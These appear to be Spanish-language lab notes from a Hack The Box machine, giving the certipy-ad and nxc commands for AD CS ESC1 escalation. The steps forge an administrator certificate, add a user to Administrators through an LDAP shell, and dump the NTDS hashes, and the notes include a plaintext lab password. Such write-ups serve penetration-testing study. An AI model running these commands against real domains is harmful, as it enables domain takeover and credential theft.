Escalada de Privilegios: AD CS (Active Directory Certificate Services)

ESC1

Enumerar plantillas vulnerables

certipy-ad find -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56 -vulnerable

Crear cuenta de equipo ruiz$:ruiz123

# ENROLL sobre Domain\Computers
certipy-ad account create -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56 -user ruiz$ -pass ruiz123

Crear certificado con esa plantilla y equipo

certipy-ad req -username 'ruiz$' -password 'ruiz123' -ca AUTHORITY-CA  -template CorpVPN -upn administrator@authority.htb -dc-ip 10.129.229.56
# Se crea administrator.pfx

Error KDC_ERR_PADATA_TYPE_NOSUPP: Conexión por LDAP_SHELL

certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.229.56 -ldap-shell
# Shell LDAP: Añadir svc_ldap a Administrators
add_user_to_group svc_ldap administrators

Dumpear NTDS

# svc_ldap ahora es Domain Admin 
nxc smb 10.129.229.56 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' --ntds
